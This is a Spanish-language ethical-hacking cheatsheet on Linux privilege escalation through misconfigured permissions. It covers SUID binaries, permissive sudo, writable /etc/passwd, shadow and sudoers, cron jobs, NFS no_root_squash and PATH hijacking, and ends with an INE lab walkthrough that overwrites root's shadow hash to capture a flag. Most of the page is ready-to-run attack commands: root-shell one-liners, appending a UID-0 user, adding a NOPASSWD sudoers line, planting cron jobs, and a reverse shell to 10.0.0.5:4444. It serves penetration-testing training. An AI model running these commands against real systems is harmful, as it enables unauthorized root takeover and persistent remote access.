
# Misconfigured File Permissions

Las configuraciones incorrectas de permisos en archivos y directorios representan una de las vías más comunes para la escalada de privilegios en sistemas Linux. Un atacante con acceso limitado puede explotar estos errores para obtener acceso root o de otro usuario privilegiado.

## <mark style="color:purple;">SUID y SGID</mark>

#### **¿Qué es SUID/SGID?**

Cuando un archivo ejecutable tiene el bit **SUID** (Set User ID) activado, se ejecuta con los permisos del **propietario** del archivo, no del usuario que lo ejecuta. Si el propietario es `root`, el programa se ejecutará con privilegios de superusuario. El bit **SGID** funciona de manera similar, pero con los permisos del grupo propietario.

Esta funcionalidad es legítima para ciertas operaciones del sistema (como `passwd`), pero cuando se aplica incorrectamente a binarios peligrosos, permite a un usuario sin privilegios ejecutar comandos como root.

#### **¿Cómo explotarlo?**

**Identificar binarios SUID**:

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

**Verificar binarios peligrosos**:

Busca binarios como `bash`, `sh`, `find`, `vim`, `nano`, `cp`, `mv`, `cat`, `less`, `more`, `awk`, `python`, `perl`, `php`, etc.

**Explotar según el binario encontrado**:

<table data-header-hidden><thead><tr><th width="135.3333740234375"></th><th></th></tr></thead><tbody><tr><td>Binario</td><td>Comando de explotación</td></tr><tr><td><code>find</code></td><td><code>find /tmp -exec /bin/sh \; -quit</code></td></tr><tr><td><code>bash</code></td><td><code>bash -p</code></td></tr><tr><td><code>vim</code></td><td><code>vim -c ':!/bin/sh'</code></td></tr><tr><td><code>nano</code></td><td><code>nano</code> → <code>Ctrl+R</code> → <code>Ctrl+X</code> → <code>reset; sh 1>&#x26;0 2>&#x26;0</code></td></tr><tr><td><code>cp</code></td><td><code>cp /etc/shadow /tmp/shadow</code> (si es escribible)</td></tr><tr><td><code>python</code></td><td><code>python -c 'import os; os.setuid(0); os.system("/bin/sh")'</code></td></tr><tr><td><code>perl</code></td><td><code>perl -e 'setuid(0); exec("/bin/sh");'</code></td></tr></tbody></table>

**Comandos clave para explotar SUID**

<table data-header-hidden><thead><tr><th width="235.3333740234375"></th><th></th></tr></thead><tbody><tr><td>Acción</td><td>Comando</td></tr><tr><td>Listar binarios SUID</td><td><code>find / -perm -4000 -type f 2>/dev/null</code></td></tr><tr><td>Listar binarios SGID</td><td><code>find / -perm -2000 -type f 2>/dev/null</code></td></tr><tr><td>Ejecutar shell con SUID</td><td><code>find / -exec /bin/sh \; -quit</code></td></tr><tr><td>Escalar con bash SUID</td><td><code>/bin/bash -p</code></td></tr><tr><td>Escalar con python SUID</td><td><code>python -c 'import os; os.execl("/bin/sh", "sh", "-p")'</code></td></tr></tbody></table>

***

## <mark style="color:purple;">Sudo mal configurado</mark>

`sudo` permite a usuarios autorizados ejecutar comandos con privilegios elevados. Cuando la configuración en `/etc/sudoers` es demasiado permisiva (por ejemplo, permitir ejecutar comandos sin contraseña o permitir binarios peligrosos), un atacante puede escalar privilegios.

#### **¿Cómo explotarlo?**

**Verificar permisos sudo**:

```bash
sudo -l
```

Lista los comandos que el usuario actual puede ejecutar con `sudo`.

**Identificar comandos peligrosos**:

Busca editores (`vim`, `nano`), shells (`bash`, `sh`, `python`, `perl`), o cualquier binario que permita ejecutar comandos arbitrarios.

**Explotar según el binario permitido**:

<table data-header-hidden><thead><tr><th width="206.66668701171875"></th><th></th></tr></thead><tbody><tr><td>Comando permitido</td><td>Explotación</td></tr><tr><td><code>ALL=(ALL) ALL</code></td><td><code>sudo su -</code> o <code>sudo -i</code></td></tr><tr><td><code>NOPASSWD: ALL</code></td><td><code>sudo -i</code> (sin pedir contraseña)</td></tr><tr><td><code>vim</code></td><td><code>sudo vim -c ':!/bin/sh'</code></td></tr><tr><td><code>find</code></td><td><code>sudo find / -exec /bin/sh \;</code></td></tr><tr><td><code>python</code></td><td><code>sudo python -c 'import pty; pty.spawn("/bin/sh")'</code></td></tr><tr><td><code>apt</code></td><td><code>sudo apt update &#x26;&#x26; sudo apt install -f /dev/stdin</code></td></tr><tr><td><code>systemctl</code></td><td><code>sudo systemctl start servicio_malicioso</code></td></tr><tr><td><code>docker</code></td><td><code>sudo docker run -it --privileged ubuntu bash</code></td></tr></tbody></table>

#### **Comandos clave para Sudo**

<table data-header-hidden><thead><tr><th width="271.33331298828125"></th><th></th></tr></thead><tbody><tr><td>Acción</td><td>Comando</td></tr><tr><td>Verificar privilegios sudo</td><td><code>sudo -l</code></td></tr><tr><td>Obtener shell como root</td><td><code>sudo -i</code></td></tr><tr><td>Ejecutar comando como root</td><td><code>sudo &#x3C;comando></code></td></tr><tr><td>Leer archivos restringidos</td><td><code>sudo cat /etc/shadow</code></td></tr><tr><td>Escalar con editor</td><td><code>sudo vim -c ':!/bin/sh'</code></td></tr></tbody></table>

***

## <mark style="color:purple;">Permisos de escritura incorrectos</mark>

### **Writable /etc/passwd**

`/etc/passwd` es un archivo crítico que contiene información de cuentas de usuario. Si un usuario sin privilegios puede escribir en este archivo, puede crear un nuevo usuario con UID 0 (root) o modificar la contraseña de un usuario existente.

#### **¿Cómo explotarlo?**

**Verificar permisos**:

```bash
ls -l /etc/passwd
```

Si muestra `-rw-rw-r--` o `-rw-rw-rw-`, el archivo es modificable.

**Generar hash de contraseña**:

```bash
openssl passwd -1 -salt mysalt newpassword
```

**Añadir nuevo usuario root**:

```bash
echo "newroot:$(openssl passwd -1 -salt mysalt newpassword):0:0:root:/root:/bin/bash" >> /etc/passwd
```

**Cambiar a root**:

```bash
su newroot
# o
su - newroot
```

#### **Comandos clave**

<table data-header-hidden><thead><tr><th width="254.66668701171875"></th><th></th></tr></thead><tbody><tr><td>Acción</td><td>Comando</td></tr><tr><td>Verificar permisos</td><td><code>ls -l /etc/passwd</code></td></tr><tr><td>Generar hash MD5</td><td><code>openssl passwd -1 -salt salt password</code></td></tr><tr><td>Generar hash SHA-512</td><td><code>openssl passwd -6 -salt salt password</code></td></tr><tr><td>Añadir usuario root</td><td><code>echo "hacker:$(openssl passwd -1 hacker):0:0:root:/root:/bin/bash" >> /etc/passwd</code></td></tr><tr><td>Modificar contraseña de root</td><td>Editar línea de root en <code>/etc/passwd</code> reemplazando la <code>x</code> por el hash</td></tr></tbody></table>

### **Writable /etc/sudoers**

Si el archivo `/etc/sudoers` es escribible (aunque normalmente es de solo lectura), puedes añadir una línea para que tu usuario ejecute cualquier comando como root sin contraseña.

**Comandos**:

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo -i
```

### **Writable /etc/shadow**

`/etc/shadow` contiene los hashes de contraseñas. Si es escribible, puedes reemplazar el hash de root con un hash conocido.

**Comandos**:

```bash
# Generar hash
openssl passwd -1 newpassword
# Editar /etc/shadow y reemplazar el hash de root
nano /etc/shadow
# Luego usar su para cambiar a root
su root
```

### **Writable \~/.ssh/authorized\_keys**

Si puedes escribir en el archivo `authorized_keys` de un usuario privilegiado, puedes añadir tu clave pública SSH y conectarte como ese usuario.

**Comandos**:

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAA..." >> /home/root/.ssh/authorized_keys
ssh root@localhost
```

***

## <mark style="color:purple;">Cron Jobs mal configurados</mark>

Cron es el servicio de programación de tareas de Linux. Las tareas pueden ejecutarse como `root` o como otros usuarios. Si un script ejecutado por cron tiene permisos de escritura para un usuario no privilegiado, ese usuario puede modificar el script y ejecutar comandos arbitrarios como `root` cuando cron lo ejecute.

#### **Tipos de vulnerabilidades en cron:**

<table data-header-hidden><thead><tr><th width="203.66668701171875"></th><th></th><th></th></tr></thead><tbody><tr><td>Vulnerabilidad</td><td>Descripción</td><td>Explotación</td></tr><tr><td><strong>Script escribible</strong></td><td>El script ejecutado por cron es modificable por el usuario</td><td>Añadir comandos maliciosos al script</td></tr><tr><td><strong>Directorio escribible</strong></td><td>El directorio que contiene scripts de cron es modificable</td><td>Crear un nuevo script en el directorio</td></tr><tr><td><strong>PATH hijacking</strong></td><td>Cron usa un PATH inseguro</td><td>Crear un binario malicioso con el nombre de un comando usado en el script</td></tr><tr><td><strong>Wildcard injection</strong></td><td>El script usa comodines (*) con comandos como <code>tar</code></td><td>Crear archivos con nombres que actúan como parámetros maliciosos</td></tr></tbody></table>

#### **¿Cómo explotarlo?**

**Enumerar tareas cron**:

```bash
cat /etc/crontab
ls -la /etc/cron.*
find /etc/cron* -type f 2>/dev/null
```

**Identificar scripts ejecutados como root**:

```bash
grep -r "root" /etc/cron* 2>/dev/null
```

**Verificar permisos de scripts**:

```bash
find /etc/cron* -writable -type f 2>/dev/null
find /var/spool/cron -writable -type f 2>/dev/null
```

**Explotar script escribible**:

```bash
# Añadir reverse shell al script
echo 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1' >> /etc/cron.hourly/backup.sh

# O crear un SUID bash
echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' >> /etc/cron.hourly/backup.sh
```

**Explotar directorio escribible**:

```bash
cd /etc/cron.d
cat > exploit << EOF
* * * * * root chmod +xs /bin/bash
EOF
# Esperar un minuto y ejecutar /bin/bash -p
```

#### **Comandos clave para Cron**

<table data-header-hidden><thead><tr><th width="285.33331298828125"></th><th></th></tr></thead><tbody><tr><td>Acción</td><td>Comando</td></tr><tr><td>Listar cron jobs del sistema</td><td><code>cat /etc/crontab</code></td></tr><tr><td>Listar cron jobs por directorio</td><td><code>ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/</code></td></tr><tr><td>Buscar scripts ejecutables</td><td><code>find /etc/cron* /var/spool/cron -type f 2>/dev/null</code></td></tr><tr><td>Buscar scripts escribibles</td><td><code>find /etc/cron* /var/spool/cron -writable -type f 2>/dev/null</code></td></tr><tr><td>Buscar directorios escribibles</td><td><code>find /etc/cron* -writable -type d 2>/dev/null</code></td></tr><tr><td>Crear script malicioso en cron.d</td><td><code>echo "* * * * * root chmod 777 /etc/shadow" > /etc/cron.d/exploit</code></td></tr></tbody></table>

***

## <mark style="color:purple;">NFS mal configurado</mark>

NFS permite compartir directorios entre sistemas. Si un export NFS está configurado con `no_root_squash`, los clientes pueden acceder a los archivos como `root` en el servidor, permitiendo escalada de privilegios.

#### **¿Cómo explotarlo?**

**Enumerar NFS exports**:

```bash
showmount -e localhost
```

**Montar el share**:

```bash
mkdir /tmp/mount
mount -t nfs localhost:/exported/path /tmp/mount
```

**Crear un binario SUID** (si `no_root_squash` está activado):

```bash
# Desde el cliente, como root local (puedes usar fakechroot)
cp /bin/bash /tmp/mount/bash
chmod +xs /tmp/mount/bash
```

**Ejecutar el binario en el servidor**:

```bash
/path/to/mount/bash -p
```

#### **Comandos clave para NFS**

<table data-header-hidden><thead><tr><th width="219.33331298828125"></th><th></th></tr></thead><tbody><tr><td>Acción</td><td>Comando</td></tr><tr><td>Verificar exports</td><td><code>cat /etc/exports</code></td></tr><tr><td>Listar exports remotos</td><td><code>showmount -e &#x3C;IP></code></td></tr><tr><td>Montar export</td><td><code>mount -t nfs &#x3C;IP>:/path /local/mount</code></td></tr><tr><td>Crear SUID binary</td><td><code>cp /bin/bash /local/mount/bash &#x26;&#x26; chmod +xs /local/mount/bash</code></td></tr></tbody></table>

***

## <mark style="color:purple;">Variables de entorno (PATH hijacking)</mark>

Si un programa con privilegios elevados ejecuta un comando sin especificar su ruta absoluta, y el usuario puede modificar la variable de entorno `PATH`, puede hacer que el programa ejecute su propio binario malicioso en lugar del sistema.

#### **¿Cómo explotarlo?**

**Identificar programas que usan comandos sin ruta absoluta**.

**Modificar PATH**:

```bash
export PATH=/tmp:$PATH
```

**Crear un binario malicioso con el nombre del comando**:

```bash
echo '/bin/bash' > /tmp/ls
chmod +x /tmp/ls
```

**Ejecutar el programa vulnerable**.

#### **Comandos clave para PATH hijacking**

<table data-header-hidden><thead><tr><th width="259.33331298828125"></th><th></th></tr></thead><tbody><tr><td>Acción</td><td>Comando</td></tr><tr><td>Ver PATH actual</td><td><code>echo $PATH</code></td></tr><tr><td>Añadir directorio al PATH</td><td><code>export PATH=/tmp:$PATH</code></td></tr><tr><td>Crear binario falso</td><td><code>echo '#!/bin/bash' > /tmp/ls &#x26;&#x26; chmod +x /tmp/ls</code></td></tr></tbody></table>

***

## <mark style="color:purple;">LinPEAS</mark>

{% content-ref url="/pages/H66BqVhSzHLPvQFclWwC" %}
[Linpeas](/ethical-hacking-cheatsheet/post-explotacion/escalada-de-privilegios/escalada-de-privilegios-en-linux/linpeas.md)
{% endcontent-ref %}

LinPEAS es una herramienta automatizada que enumera vectores de escalada de privilegios, incluyendo SUID binaries, sudo mal configurado, archivos escribibles, cron jobs vulnerables, etc.:

```bash
# Descargar
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Ejecutar
chmod +x linpeas.sh
./linpeas.sh
```

***

## <mark style="color:purple;">Cheatsheet</mark>

<table data-header-hidden><thead><tr><th width="310"></th><th></th></tr></thead><tbody><tr><td>Acción</td><td>Comando</td></tr><tr><td>Buscar binarios SUID</td><td><code>find / -perm -4000 -type f 2>/dev/null</code></td></tr><tr><td>Buscar binarios SGID</td><td><code>find / -perm -2000 -type f 2>/dev/null</code></td></tr><tr><td>Verificar privilegios sudo</td><td><code>sudo -l</code></td></tr><tr><td>Buscar archivos escribibles</td><td><code>find / -writable -type f 2>/dev/null</code></td></tr><tr><td>Buscar cron jobs escribibles</td><td><code>find /etc/cron* -writable -type f 2>/dev/null</code></td></tr><tr><td>Verificar permisos de /etc/passwd</td><td><code>ls -l /etc/passwd</code></td></tr><tr><td>Verificar permisos de /etc/shadow</td><td><code>ls -l /etc/shadow</code></td></tr><tr><td>Listar NFS exports</td><td><code>showmount -e localhost</code></td></tr><tr><td>Ejecutar LinPEAS</td><td><code>./linpeas.sh</code></td></tr><tr><td>Escalar con find SUID</td><td><code>find / -exec /bin/sh \; -quit</code></td></tr><tr><td>Escalar con sudo</td><td><code>sudo -i</code></td></tr><tr><td>Añadir usuario root a /etc/passwd</td><td><code>echo "hacker:$(openssl passwd -1 hacker):0:0:root:/root:/bin/bash" >> /etc/passwd</code></td></tr></tbody></table>

***

## <mark style="color:purple;">Lab: Permissions Matters!</mark>

El administrador tenía la tarea de crear una réplica de un sistema Linux existente. Copió todo el sistema de archivos a su computadora, modificó algunos archivos y luego lo copió al sistema recién configurado. Desafortunadamente, en su prisa por configurar el nuevo sistema, olvidó configurar los permisos.

Accedemos a

```bash
http://target.ine.local:8000/
```

Y vemos que estamos dentro del servidor como student sin permisos sudo:

```bash
student@target:~$ whoami
student
student@target:~$ sudo -l
bash: sudo: command not found
```

### Buscar archivos escribibles

```bash
student@target:~$ find / -writable -type f 2>/dev/null
/proc/keys
/proc/kcore
/proc/pressure/io
/proc/pressure/cpu
/proc/pressure/memory
/proc/timer_list
/proc/latency_stats
/proc/1/task/1/sched
<---SNIP--->
/dev/zero
/dev/urandom
/etc/shadow
```

Observamos que podemos escribir en el archivo `/etc/shadow`!

### Ver permisos de Shadow

Observamos que tenemos permisos rw (read write) sobre el archivo:

```bash
student@target:~$ ls -l /etc/shadow
-rw-rw-rw- 1 root shadow 523 Sep 23  2018 /etc/shadow
```

### Cambiar la contraseña de root

Usaremos openssl para generar un hash con una nueva contraseña:

```
student@target:~$ openssl passwd -1 newpass
$1$LaXq4jok$.ftObbp/nGGp8jglK2cN8.
```

Editamos el archivo /etc/shadow:

{% hint style="info" %}
Pulsamos la tecla `i` para editar el archivo, quitamos el asterisco `*`, y con `:wq` guardamos y cerramos.
{% endhint %}

```bash
vim /etc/shadow

root:$1$LaXq4jok$.ftObbp/nGGp8jglK2cN8.:17764:0:99999:7:::
daemon:*:17764:0:99999:7:::
bin:*:17764:0:99999:7:::
sys:*:17764:0:99999:7:::
sync:*:17764:0:99999:7:::
games:*:17764:0:99999:7:::
man:*:17764:0:99999:7:::
lp:*:17764:0:99999:7:::

:wq
```

### Cambiamos a root

```bash
student@target:~$ su
Password: newpass

root@target:/home/student# whoami
root
```

### Acceso a la flag

```bash
root@target:/home/student# cd /root
root@target:~# ls
flag
root@target:~# cat flag
e62ab67ddff744d60cbb6232********
```
